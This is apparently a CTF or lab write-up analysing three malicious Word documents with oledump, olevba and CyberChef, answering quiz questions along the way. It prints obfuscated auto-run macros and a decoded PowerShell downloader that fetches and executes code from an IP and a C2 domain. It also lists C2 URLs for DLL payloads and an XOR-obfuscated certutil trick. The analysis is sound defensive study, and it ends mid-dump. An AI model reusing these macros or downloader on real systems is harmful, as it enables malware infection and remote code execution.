
In the maldocs directory we see attacker(1-5).doc

# Attacker 1

We will be looking at attacker1.doc

The goal is to analyze it for details like payloads, C2 info, metadata, obfuscation, etc. 

I start by listing the OLE streams in the document. OLE streams are where macros and embedded data hide in Office files.

```shell
oledump.py attacker1.doc
```

This shows a list of streams (1-13). Stream 8 is marked with an "M" and indicates VBA macros.

```text
8: M    9852 'Macros/VBA/ThisDocument'
```

According to google:
*"VBA macros are small programs written in Visual Basic for Applications (VBA) that automate tasks within Microsoft Office applications like Excel, Word, and PowerPoint. They are used to streamline repetitive actions, perform complex calculations, and create custom functionalities beyond the standard features of the software."*

SS1

So now the next step would be to dump the VBA macro

```shell
oledump.py -s 8 attacker1.doc -v
```

The output is:

```text
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Sub AutoOpen()
On Error Resume Next
DBvbDlfxWGXm = WifblkBfDS + CBool(2243) + Len(ChrW(5 + 9) + ChrW(3)) + LenB(Trim("QHSiqJpWNfHbmnlvPbbP")) + Len(lZlRjJlQKnBntw)
lQbWzTrJtfhGiaS = pWNDRZbLZdGgl + CBool(5015) + Len(ChrW(1 + 1) + ChrW(2)) + LenB(Trim("XkBMzwHsSZswNPQMBDL")) + Len(SxZnBTiJkRBD)

tcZwqHFss = zTQlVkgJtJHVH + CBool(6903) + Len(ChrW(6 + 4) + ChrW(10)) + LenB(Trim("jDxtDndtrsCpNSNkxdJzhj")) + Len(RRdTnGKKsvm)

qDRjdabdvLvw = bDhgcvpVdcXNV + CBool(6163) + Len(ChrW(2 + 7) + ChrW(10)) + LenB(Trim("TisXGlccaikddjLpXZhn")) + Len(hVXaKsWdqGRalHZ)

TJgSBgQcFDq = xHtTibzqdL + CBool(6499) + Len(ChrW(2 + 7) + ChrW(1)) + LenB(Trim("iFvxjMCgcVJTWgGHG")) + Len(aQkXvbNzGWvh)
GWGjfdpJrxkg = PfFKPmwSmLwNT + CBool(2009) + Len(ChrW(4 + 7) + ChrW(6)) + LenB(Trim("kdHfDqVfHbpXcWBalpBj")) + Len(jwrLSVvTGmNgSNh)
   CCvSPPJWbrLcHS = ""

fhjjZvgrrjq = mFGCJxVWBXjkl + CBool(1344) + Len(ChrW(8 + 10) + ChrW(3)) + LenB(Trim("bTZapLhFkwRKZPK")) + Len(SWsFlrFhBaHlgGg)
   rjvFRbqzLtkzn = "" + ""

GnxslaCGaT = qqmRcwgpqlk + CBool(6041) + Len(ChrW(1 + 2) + ChrW(7)) + LenB(Trim("FvacXVVTqjKJxgdZjv")) + Len(QdRJwGnCHinZ)
xDgzRpPhghWrJL = NfHHmGCha + CBool(347) + Len(ChrW(3 + 10) + ChrW(10)) + LenB(Trim("QRgSjBfjthjpDkPxVpmDlb")) + Len(jWwMxvjadBtl)


tTRXtXmcgPrktFh = jdmzHVMkcVXcdMP + CBool(5783) + Len(ChrW(2 + 10) + ChrW(10)) + LenB(Trim("rnkhGPWpTBpGNcVlk")) + Len(irVHvSQQvHtd)


GhFdPWgpiqRj = CNLqTtpWDztqK + CBool(8793) + Len(ChrW(1 + 8) + ChrW(9)) + LenB(Trim("SXNhbQpQzmwVQlTmR")) + Len(RJaDmljLvpgjz)



LbZlvNQVaFtMi = vxPLFqFShhCqh + CBool(6141) + Len(ChrW(6 + 10) + ChrW(3)) + LenB(Trim("HahDZGNRJvHTcDKWPnnl")) + Len(zzfDDCMbPXrM)

   SKKdjMpgJRQRK = "" + "" + Trim("")

ppBLnCMSjnSV = fPSQKCwZHRJ + CBool(6767) + Len(ChrW(6 + 9) + ChrW(3)) + LenB(Trim("cwZGhscSkqdkCDrjXnTS")) + Len(dmfMtsadBraSX)


pzSpxTNqbhCwW = DVsGkQJsLPQCcZqt + CBool(1865) + Len(ChrW(2 + 8) + ChrW(6)) + LenB(Trim("kZNsfRinpsRKqfNnF")) + Len(laLlSgkFRvtad)
JtnpWHTxSiiz = aCwfgTJDmbRQW + CBool(6925) + Len(ChrW(9 + 10) + ChrW(2)) + LenB(Trim("dDWBignPNFqBkrjqZlKiT")) + Len(chdsMqJKtKM)

QmrcNWGaSgCWz = lFQtNLhczCraQG + CBool(3980) + Len(ChrW(3 + 8) + ChrW(6)) + LenB(Trim("VKvjZliFSGsfCGKhSf")) + Len(KPgHQGtPqLTjphCn)
   hdNxDVBxCTqQTpB = LTrim("")
nFtNXRVXbdFr = VPWjviWKBpJi + CBool(7052) + Len(ChrW(4 + 5) + ChrW(8)) + LenB(Trim("VBjjdfMslCcHNgbjJa")) + Len(nBDKwlZJvRMwRR)

gLkHkMNJpWGPiM = qcmPmHlmdWZqj + CBool(194) + Len(ChrW(7 + 5) + ChrW(1)) + LenB(Trim("ZTTXLrVxkWNKjjPrfCj")) + Len(crtmLCNraQLF)
zMzTwHmjJjndL = rDZKxGvDrNBJ + CBool(3433) + Len(ChrW(7 + 9) + ChrW(1)) + LenB(Trim("XaMLmrHxaSlqSXV")) + Len(ptlCjjDiKZ)

MNKsCVNXktg = hdJScJQgXmkm + CBool(2807) + Len(ChrW(7 + 5) + ChrW(9)) + LenB(Trim("RbRanmjXmLslKkZDlB")) + Len(WfkDLfGhqhWfhTN)
nHMgbFSzmgv = TBWHlimLMV + CBool(7832) + Len(ChrW(9 + 8) + ChrW(10)) + LenB(Trim("LsHkNQtMsMzltJgPQgfkR")) + Len(JHxRSZaqkRwtHi)
   RJzJQGRzrc = ""


MCFxxPbQXmfGfnL = NsLSSSLGDfkwlt + CBool(5937) + Len(ChrW(6 + 9) + ChrW(3)) + LenB(Trim("SNpRVqvVcnPhX")) + Len(gJMqliiHCRNZQTc)
LdnJwgZjbnKqtaa = aBBZDWsTDPPnS + CBool(8258) + Len(ChrW(7 + 3) + ChrW(4)) + LenB(Trim("faLQCswVKLgWjmJKg")) + Len(KmpHBhFRwlKKMm)

FHvwQsqqdgbr = wtDvZMrVDatsPG + CBool(8557) + Len(ChrW(6 + 1) + ChrW(4)) + LenB(Trim("lDjJcSLdkCqGrRzwdlKHLVHn")) + Len(qlkRQRpBTtrm)
CiRSdXZHwV = NKxZvdzbPWxxN + CBool(1618) + Len(ChrW(10 + 4) + ChrW(4)) + LenB(Trim("pJRTVfBcDhxrcwKkPDbFt")) + Len(wKPlSJwvvXqW)


xVpspwsllZGqG = MpTBwVxXgdanm + CBool(5472) + Len(ChrW(1 + 3) + ChrW(5)) + LenB(Trim("KlilNHcTHfLXgQgkkRH")) + Len(tlWSglqmcgHrcq)

   CWflqnrJbKVBj = RTrim("") + ""
kkCTbdBcJnsGw = sFdLzbirFimt + CBool(6092) + Len(ChrW(6 + 7) + ChrW(8)) + LenB(Trim("cvXVCvgQfdqkdZkQwadmPMg")) + Len(acSnFqKQZJkgq)

cGvRqkvVFLFzsK = mChrRcSmQTlzbtd + CBool(476) + Len(ChrW(5 + 5) + ChrW(9)) + LenB(Trim("iXZiMssZcgzrHZrcFvVtk")) + Len(iixsSRWTqT)


   
QwXhZsRSjsaLm = FracTilLgHn + CBool(590) + Len(ChrW(4 + 8) + ChrW(7)) + LenB(Trim("MNhhbMhpCpvcwlCCWRgfhFc")) + Len(igrKGJjKXXfr)

   Set pNHbvwXpnbZvS = Shapes(Trim("h9mkae7"))
dWDHaNGFDcG = iGKRcdzDwMZzqlWN + CBool(2417) + Len(ChrW(5 + 3) + ChrW(4)) + LenB(Trim("hDNlqMjmcDXrwkrDwq")) + Len(mQhXDqaHVLMab)
zVRvpZVSlZP = jxrRCZTpPSjqG + CBool(747) + Len(ChrW(9 + 2) + ChrW(3)) + LenB(Trim("wnkLGNvnwtBPGKxVMs")) + Len(HmbfaFbBPKWJstpW)

   VBA.Shell# "CmD /C " + Trim(rjvFRbqzLtkzn) + SKKdjMpgJRQRK + Trim(Replace(pNHbvwXpnbZvS.AlternativeText + "", "[", "A")) + hdNxDVBxCTqQTpB + RJzJQGRzrc + CWflqnrJbKVBj, CInt(351 * 2 + -702)
lFbSwGcXvLj = ZcCmWkkqqB + CBool(3868) + Len(ChrW(10 + 10) + ChrW(7)) + LenB(Trim("GpsfXGHdXPiPBQWm")) + Len(CxtsBzHdKBGmb)
gQVFVamfZLZ = GgRgBdCqvLXk + CBool(260) + Len(ChrW(4 + 5) + ChrW(3)) + LenB(Trim("pSdvPiVsNHZWVbr")) + Len(ZxkaZVpVviNG)
   

XXDBdSGLmXrT = kkfQTPTJpjjs + CBool(9051) + Len(ChrW(4 + 6) + ChrW(1)) + LenB(Trim("RkTPBgXDhBTgMXtKSb")) + Len(bvfFxpHJWlX)

rhfWlBhJNxhXd = DbfBblNVjZrSd + CBool(7064) + Len(ChrW(10 + 10) + ChrW(6)) + LenB(Trim("MwstcPJvhangVNZapdZ")) + Len(jfPdPngPqkfl)
PrBtRSHfsVF = PDvGhnzPcxhD + CBool(1483) + Len(ChrW(5 + 8) + ChrW(1)) + LenB(Trim("tvjtZQfzHdgNNRHZqilSN")) + Len(JJLiShTtqxhXr)




fXsWigQMrcFc = mxpJbmSSQ + CBool(5222) + Len(ChrW(10 + 8) + ChrW(10)) + LenB(Trim("rdlmccJkfVhXRccQBM")) + Len(RkVtwCRbFKwknG)
dgDaZRkBlQp = MvZcVWwwaGt + CBool(5297) + Len(ChrW(4 + 6) + ChrW(5)) + LenB(Trim("VgBdpkxSLXdGbgLKh")) + Len(qNJnfcLpkQXcp)

wdTqKxXzraCs = mkaDKJfCfVRm + CBool(8379) + Len(ChrW(1 + 10) + ChrW(5)) + LenB(Trim("klTWfaFrtslwGtgadMj")) + Len(GvivfXcsHC)




End Sub

```

The code is obfuscated so there is no obvious thing that jumps out.

SS2

To confirm auto-exec,

```shell
olevba attacker1.doc
```

```text
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```


If we look at the other non-macro streams we see something interesting in stream 4

```shell
oledump.py -s 4 attacker1.doc -S
```

SS3

```text
J[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[EE[YwB0[Gk[dgBh[HQ[bwBy[F0[Og[6[EM[cgBl[GE[d[Bl[Ek[bgBz[HQ[YQBu[GM[ZQ[o[CI[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[CI[KQ[7[[0[Cg[k[G0[ZQB0[Gg[bwBk[C[[PQ[g[Fs[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[F0[LgBH[GU[d[BN[GU[d[Bo[G8[Z[Bz[Cg[KQ[7[[0[CgBm[G8[cgBl[GE[YwBo[Cg[J[Bt[C[[aQBu[C[[J[Bt[GU[d[Bo[G8[Z[[p[Hs[DQ[K[[0[Cg[g[C[[aQBm[Cg[J[Bt[C4[TgBh[G0[ZQ[g[C0[ZQBx[C[[IgBE[G8[dwBu[Gw[bwBh[GQ[UwB0[HI[aQBu[Gc[Ig[p[Hs[DQ[K[C[[I[[g[C[[d[By[Hk[ew[N[[o[I[[g[C[[I[[g[CQ[dQBy[Gk[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[FM[eQBz[HQ[ZQBt[C4[VQBy[Gk[K[[i[Gg[d[B0[H[[Og[v[C8[MQ[3[DY[Lg[z[DI[Lg[z[DU[Lg[x[DY[Lw[3[D[[N[Bl[C4[c[Bo[H[[Ig[p[[0[Cg[g[C[[I[[g[C[[SQBF[Fg[K[[k[G0[LgBJ[G4[dgBv[Gs[ZQ[o[CQ[aQBu[HM[d[Bh[G4[YwBl[Cw[I[[o[CQ[dQBy[Gk[KQ[p[Ck[Ow[N[[o[I[[g[C[[I[B9[GM[YQB0[GM[a[B7[H0[DQ[K[[0[Cg[g[C[[fQ[N[[o[DQ[K[C[[I[Bp[GY[K[[k[G0[LgBO[GE[bQBl[C[[LQBl[HE[I[[i[EQ[bwB3[G4[b[Bv[GE[Z[BE[GE[d[Bh[CI[KQB7[[0[Cg[g[C[[I[[g[C[[d[By[Hk[ew[N[[o[I[[g[C[[I[[g[CQ[dQBy[Gk[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[FM[eQBz[HQ[ZQBt[C4[VQBy[Gk[K[[i[Gg[d[B0[H[[Og[v[C8[ZgBw[GU[d[By[GE[YQBy[GQ[ZQBs[Gw[YQ[u[GI[YQBu[GQ[LwB4[GE[c[Bf[DE[M[[y[GI[LQBB[Fo[MQ[v[Dc[M[[0[GU[LgBw[Gg[c[[/[Gw[PQBs[Gk[d[B0[GU[bg[0[C4[ZwBh[HM[Ig[p[[0[Cg[g[C[[I[[g[C[[J[By[GU[cwBw[G8[bgBz[GU[I[[9[C[[J[Bt[C4[SQBu[HY[bwBr[GU[K[[k[Gk[bgBz[HQ[YQBu[GM[ZQ[s[C[[K[[k[HU[cgBp[Ck[KQ[7[[0[Cg[N[[o[I[[g[C[[I[[g[CQ[c[Bh[HQ[a[[g[D0[I[Bb[FM[eQBz[HQ[ZQBt[C4[RQBu[HY[aQBy[G8[bgBt[GU[bgB0[F0[Og[6[Ec[ZQB0[EY[bwBs[GQ[ZQBy[F[[YQB0[Gg[K[[i[EM[bwBt[G0[bwBu[EE[c[Bw[Gw[aQBj[GE[d[Bp[G8[bgBE[GE[d[Bh[CI[KQ[g[Cs[I[[i[Fw[X[BR[GQ[WgBH[F[[LgBl[Hg[ZQ[i[Ds[DQ[K[C[[I[[g[C[[I[Bb[FM[eQBz[HQ[ZQBt[C4[SQBP[C4[RgBp[Gw[ZQBd[Do[OgBX[HI[aQB0[GU[QQBs[Gw[QgB5[HQ[ZQBz[Cg[J[Bw[GE[d[Bo[Cw[I[[k[HI[ZQBz[H[[bwBu[HM[ZQ[p[Ds[DQ[K[[0[Cg[g[C[[I[[g[C[[J[Bj[Gw[cwBp[GQ[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[Ec[dQBp[GQ[I[[n[EM[M[[4[EE[RgBE[Dk[M[[t[EY[MgBB[DE[LQ[x[DE[R[[x[C0[O[[0[DU[NQ[t[D[[M[BB[D[[Qw[5[DE[Rg[z[Dg[O[[w[Cc[DQ[K[C[[I[[g[C[[I[[k[HQ[eQBw[GU[I[[9[C[[WwBU[Hk[c[Bl[F0[Og[6[Ec[ZQB0[FQ[eQBw[GU[RgBy[G8[bQBD[Ew[UwBJ[EQ[K[[k[GM[b[Bz[Gk[Z[[p[[0[Cg[g[C[[I[[g[C[[J[Bv[GI[agBl[GM[d[[g[D0[I[Bb[EE[YwB0[Gk[dgBh[HQ[bwBy[F0[Og[6[EM[cgBl[GE[d[Bl[Ek[bgBz[HQ[YQBu[GM[ZQ[o[CQ[d[B5[H[[ZQ[p[[0[Cg[g[C[[I[[g[C[[J[Bv[GI[agBl[GM[d[[u[EQ[bwBj[HU[bQBl[G4[d[[u[EE[c[Bw[Gw[aQBj[GE[d[Bp[G8[bg[u[FM[a[Bl[Gw[b[BF[Hg[ZQBj[HU[d[Bl[Cg[J[Bw[GE[d[Bo[Cw[J[Bu[HU[b[[s[C[[J[Bu[HU[b[[s[C[[J[Bu[HU[b[[s[D[[KQ[N[[o[DQ[K[C[[I[[g[C[[I[B9[GM[YQB0[GM[a[B7[H0[DQ[K[C[[I[[g[C[[I[[N[[o[I[[g[H0[DQ[K[H0[DQ[K[[0[CgBF[Hg[aQB0[Ds[DQ[K[[0[Cg[=
```

It looks to be a powershell command that has been encoded or obfuscated. 

We can use cyberchef to help. We can use From Base64 in the recipe and if we turn off the check for remove non-alphabet character we can see some patterns of possible words, but the brackets in the original text are obfuscating what we want to see, but we don't know exactly what needs to be changed. If we go back into stream 8, there is a chunk of code that might help.

```text
VBA.Shell# "CmD /C " + Trim(rjvFRbqzLtkzn) + SKKdjMpgJRQRK + Trim(Replace(pNHbvwXpnbZvS.AlternativeText + "", "[", "A")) + hdNxDVBxCTqQTpB + RJzJQGRzrc + CWflqnrJbKVBj, CInt(351 * 2 + -702)
```

SS5


There is a replace function with `[` and `A` , so we can use the Find / Replace formula in cyberchef to find `[` and replace it with `A` (note the Find option must be placed to "SIMPLE STRING"

SS6

Now we have a reasonably readable output in cyberchef (just some annoying null bytes), and if we copy it into plaintext we get:

```text
$instance = [System.Activator]::CreateInstance("System.Net.WebClient");
$method = [System.Net.WebClient].GetMethods();
foreach($m in $method){

  if($m.Name -eq "DownloadString"){
    try{
     $uri = New-Object System.Uri("http://176.32.35.16/704e.php")
     IEX($m.Invoke($instance, ($uri)));
    }catch{}

  }

  if($m.Name -eq "DownloadData"){
     try{
     $uri = New-Object System.Uri("http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas")
     $response = $m.Invoke($instance, ($uri));

     $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";
     [System.IO.File]::WriteAllBytes($path, $response);

     $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
     $type = [Type]::GetTypeFromCLSID($clsid)
     $object = [Activator]::CreateInstance($type)
     $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)

     }catch{}
     
  }
}

Exit;
```

This reveals a powershell script which when analyzed, we can answer questions from task 1.

If we look for:
- Download URLs or domains (C2).
- IP addresses and PHP paths.
- Dropped executable names and paths (e.g., %ProgramData%).
- COM objects or CLSIDs used.

We can find:

---

Q: What is the malicious C2 domain you found in the maldoc where an executable download was attempted?

A: fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas

Q: What executable file is the maldoc trying to drop?

A: QdZGP.exe

Q: In what folder is it dropping the malicious executable? (hint: %Folder%)
(The hint here is helpful, if we google CommonApplicationData folder, we can see the folder name)

SS7

A:  %ProgramData%

Q: Provide the name of the COM object the maldoc is trying to access.
(Hint is we should check the cslid field, we need to find the COM object name for C08AFD90-F2A1-11D1-8455-00A0C91F3880. I asked ChatGPT what this was.)

SS8

A: ShellBrowserWindow

Q: Include the malicious IP and the php extension found in the maldoc. (Format: IP/name.php)

A: 176.32.35.16/704e.php

Q: Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx)
(This was found earlier in stream 3)

SS9

A: 213-446-1757

Q: Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.
(From earlier when we ran `olevba attacker1.doc` we saw this)

A: AutoExec

Q: Provide the subject for this maldoc. (make sure to remove the extra whitespace)
(We can find this by running `file attacker1.doc` ) 

```text
attacker1.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1251, Title: Networked multi-state projection, Subject: West Virginia  Samanta, Author: 213-446-1757 x7135, Comments: Re-contextualized radical service-desk, Template: Normal, Last Saved By:  Windows, Revision Number: 11, Name of Creating Application: Microsoft Office Word, Total Editing Time: 03:00, Create Time/Date: Thu Apr 19 18:59:00 2018, Last Saved Time/Date: Thu Feb  7 23:45:00 2019, Number of Pages: 1, Number of Words: 1, Number of Characters: 7, Security: 0
```

A: West Virginia Samanta

Q: Provide the time when this document was last saved. (Format: YEAR-MONTH-DAY XX:XX:XX)

A: 2019-02-07 23:45:30

Q: Provide the stream number that contains a macro.

A: 8

Q: Provide the name of the stream that contains a macro.

A: ThisDocument

# Attacker 2

```shell
oledump.py attacker2.doc 
```

```text
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7427 '1Table'
  5:     63641 'Data'
  6:        97 'Macros/Form/\x01CompObj'
  7:       283 'Macros/Form/\x03VBFrame'
  8:     63528 'Macros/Form/f'
  9:      2220 'Macros/Form/o'
 10:       566 'Macros/PROJECT'
 11:        92 'Macros/PROJECTwm'
 12: M    6655 'Macros/VBA/Form'
 13: M   15671 'Macros/VBA/Module1'
 14: M    1593 'Macros/VBA/ThisDocument'
 15:     42465 'Macros/VBA/_VBA_PROJECT'
 16: M    2724 'Macros/VBA/bxh'
 17:      1226 'Macros/VBA/dir'
 18:      4096 'WordDocument'
```

SS10

We see that the streams containing macros are 12,13,14,16

Q: Provide the streams (numbers) that contain macros.

A: 12, 13, 14, 16

```shell
olevba attacker2.doc
```

```text
-------------------------------------------------------------------------------
VBA FORM Variable "b't2'" IN 'attacker2.doc' - OLE stream: 'Macros/Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://priyacareers|URL                                          |
|          |.com/u9hDQN9Yy7g/pt.|                                             |
|          |html'',''C          |                                             |
|IOC       |https://perfectdemos|URL                                          |
|          |.com/Gv1iNAuMKZ/pt.h|                                             |
|          |tml'',''C           |                                             |
|IOC       |https://bussiness-z.|URL                                          |
|          |ml/ze8pCNTIkrIS/pt.h|                                             |
|          |tml'',''C           |                                             |
|IOC       |https://cablingpoint|URL                                          |
|          |.com/ByH5NDoE3kQA/pt|                                             |
|          |.html'',''C         |                                             |
|IOC       |https://bonus.corpor|URL                                          |
|          |atebusinessmachines.|                                             |
|          |co.in/1Y0qVNce/pt.ht|                                             |
|          |ml'',''C            |                                             |
|IOC       |www1.dll            |Executable file name                         |
|IOC       |www2.dll            |Executable file name                         |
|IOC       |www3.dll            |Executable file name                         |
|IOC       |www4.dll            |Executable file name                         |
|IOC       |www5.dll            |Executable file name                         |
|IOC       |rundll32.exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
```

We can also get more details on the macros using `-i` flag for info on compiled sizes

```shell
oledump.py attacker2.doc -i
```

```text
1:       114             '\x01CompObj'
  2:      4096             '\x05DocumentSummaryInformation'
  3:      4096             '\x05SummaryInformation'
  4:      7427             '1Table'
  5:     63641             'Data'
  6:        97             'Macros/Form/\x01CompObj'
  7:       283             'Macros/Form/\x03VBFrame'
  8:     63528             'Macros/Form/f'
  9:      2220             'Macros/Form/o'
 10:       566             'Macros/PROJECT'
 11:        92             'Macros/PROJECTwm'
 12: M    6655   4978+1677 'Macros/VBA/Form'
 13: M   15671  13867+1804 'Macros/VBA/Module1'
 14: M    1593    1396+197 'Macros/VBA/ThisDocument'
 15:     42465             'Macros/VBA/_VBA_PROJECT'
 16: M    2724    2397+327 'Macros/VBA/bxh'
 17:      1226             'Macros/VBA/dir'
 18:      4096             'WordDocument'

```

Q: Provide the size (bytes) of the compiled code for the second stream that contains a macro.

A: 13867

Q: Provide the largest number of bytes found while analyzing the streams.

A: 63641

Now we are tasked with locating the command in the 'fun' field.

We can dump each macro stream to understand the code. Stream 16 contains the fun field

```shell
oledump.py -s 16 attacker2.doc -v
```

SS11

```text
fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
```

The macro has the StrReverse function. 

We can reverse the string within it in the terminal like so:

```shell
echo "sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc" | rev
```

SS12

Q: Find the command located in the ‘fun’ field ( make sure to reverse the string).

A: cmd /k cscript.exe C:\ProgramData\pin.vbs

Q: Provide the first domain found in the maldoc.
(refer back to the output from `olevba attacker2.doc`)

A: priyacareers.com/u9hDQN9Yy7g/pt.html

Q: Provide the second domain found in the maldoc.

A: perfectdemos.com/Gv1iNAuMKZ/pt.html

Q: Provide the name of the first malicious DLL it retrieves from the C2 server.

A: www1.dll

Q: How many DLLs does the maldoc retrieve from the domains?

A: 5

Q: Provide the path of where the malicious DLLs are getting dropped onto?

A: C:\ProgramData

Q: What program is it using to run DLLs?

A: rundll32.exe

Q: How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?
( we can see this here `WScript.Sleep(15000)` so just convert ms to seconds)

A: 15

Q: Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).
(we can see this here `VBA FORM STRING IN 'attacker2.doc' - OLE stream: 'Macros/Form/o'
)

A: Macros/Form/o

# Attacker 3

Looks like **Attacker 3** is trying to dominate a home base. Find his weaknesses and eliminate him.

Start with 

```shell
oledump.py attacker3.doc 
```

```text
A: word/vbaProject.bin
 A1:       423 'PROJECT'
 A2:        53 'PROJECTwm'
 A3: M    2017 'VBA/T'
 A4: m    1127 'VBA/ThisDocument'
 A5:      2976 'VBA/_VBA_PROJECT'
 A6:      1864 'VBA/__SRP_0'
 A7:       190 'VBA/__SRP_1'
 A8:       348 'VBA/__SRP_2'
 A9:       106 'VBA/__SRP_3'
A10: M    1291 'VBA/d'
A11:       723 'VBA/dir'

```

and
```shell
olevba attacker3.doc
```

```text
===============================================================================
FILE: attacker3.doc
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO T.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen()
LG = h("12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77")

Dim XN As New WshShell
Call XN.run("cmd /c set u=tutil&&call copy C:\Windows\System32\cer%u%.exe C:\ProgramData\1.exe", 0)
Call XN.run(LG, 0)

End Sub
-------------------------------------------------------------------------------
VBA MACRO d.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/d'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function h(ju)
eR = Split(ju, "%")
For lc = 0 To UBound(eR)
 hh = hh & Chr(eR(lc) Xor 111)
Next lc
h = hh
End Function
Function vY()
vY = "util"
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |1.exe               |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

Q: Provide the executable name being downloaded.

A: 1.exe

Now lets look closer into the A3 stream where the actual VBA macro lives

```shell
 oledump.py -s A3 attacker3.doc -v
```

```text
Attribute VB_Name = "T"
Sub autoopen()
